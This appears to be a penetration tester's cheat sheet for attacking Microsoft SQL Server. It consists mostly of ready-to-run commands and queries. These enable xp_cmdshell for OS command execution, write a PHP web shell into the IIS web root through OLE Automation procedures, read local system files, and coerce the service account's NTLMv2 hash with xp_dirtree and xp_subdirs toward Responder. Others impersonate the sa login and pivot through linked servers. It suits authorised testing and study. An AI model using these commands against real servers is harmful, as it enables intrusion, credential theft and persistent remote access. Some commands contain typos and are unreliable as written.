[Attacking MSSQL < BorderGate](https://www.bordergate.co.uk/attacking-mssql/#Command-Execution)

### NetExec

```bash
nxc mssql $IP -u sql_svc -p Dolphin1 -x "whoami"
```

### Commands

```bash
select * from sys.databses;
- select name from sys.databases;
- select name from master..sysdatabases;

use <DB>;
select * from sys.tables;
- select name from sys.tables;

select * from <table>;

SELECT COLUMN_NAME, DATA_TYPE
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = <TABLE>;

---
# enumerate db
enum_db

# select db
use <db>

# Check impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

# LOGIN as impersonate
EXECUTE AS LOGIN = 'hrappdb-reader'

# Enum tables
SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
```

### Connecting to the SQL Server

**sqsh**

```jsx
sqsh -S $IP -U $USER -P $PWD -h
sqsh -S $IP -U .\\$ACCOUNT_NAME -P $PWD -h
```

**impacket-mssqlclient**

```jsx
impacket-mssqlclient -p $PORT $USER@$IP
impacket-mssqlclient -p $PORT $USER@$IP -windows-auth
impacket-mssqlclient $DOMAIN/$USER:$PWD@$IP
impacket-mssqlclient $DOMAIN/$USER:$PWD@$IP -windows-auth
```

When using Windows Authentication, we need to specify the **domain name or the hostname** of the target machine. If we don’t specify a domain or hostname, it will assume **SQL Authentication and authenticate against the users created in the SQL Server.** Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targeting a local account, we can use `SERVERNAME\\accountname` or`.\\accountname` .

```jsx
sqsh -S $IP -U .\\$accountname -P $PWD -h
```

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

```jsx
SELECT name FROM master.dbo.sysdatabases;
GO

USE $DB
GO
```

### Execute Commands

- `xp_cmdshell` is a powerful feature and disabled by default. It can be enabled and disabled by using the `Policy-Based Management` or by executing `sp_configure`
- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.

```bash
# if xp_cmdshell not enabled
EXECUTE sp_configure 'show advanced options', 1
GO

# To update the currently configured value for advanced options
RECONFIGURE
GO

# To enable the feature
EXECUTE sp_configure 'xp_cmdshell', 1

# To update the currently configured value for this feature
RECONFIGURE
GO
```

### Write Files

To write files using MSSQL, we need to enable `Ole Automation Procedures` , which requires admin privileges, and then execute some stored procedures to create the file

```sql
# Enable
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestory @OLE
GO

# Read Local Files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### Capture MSSQL Service Hash

We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL server

To make this work, we need to first start `Resoponder` or `impacket-smbserver` and execute the following SQL queries

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

**Responder**

```sql
sudo responder -I tun0
```

**impacket-smbserver**

```sql
impacket-smbserver share ./ -smb2support
```

**XP_DIRTREE Hash Stealing**

```sql
EXEC master..xp_dirtree '\\$IP\share\'
GO
```

**XP_SUBDIRS Hash Stealing**

```sql
EXEC master..xp_subdirs '\\$IP\share\'
GO
```

### Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE` , that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

```sql
# Identify Users that we can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO

# Verifying our current user and role
# if 0 is returned, it indicates we do not have the sysadmin role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

# impersonating the SA user
# it's recommended to run EXECUTE AS LOGIN within the master DB
# if a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error

USE master
EXECUTE AS LOGIN ='sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

# To revert the operation and return to our previous user, we can use the Transact-SQL statement
REVERT
```

### Communicate with Other Databases with MSSQL

MSSQL has a configuration option called `linked servers` . Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those creds have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

```sql
# Identify linked servers in MSSQL
# isremote = 1 means a remote server 0 means a linked server
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)

# Next, we can attempt to identify the user used for the connection and its privileges.
# We add our command between parenthesis and specify the linked server between square brackets ([ ])
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```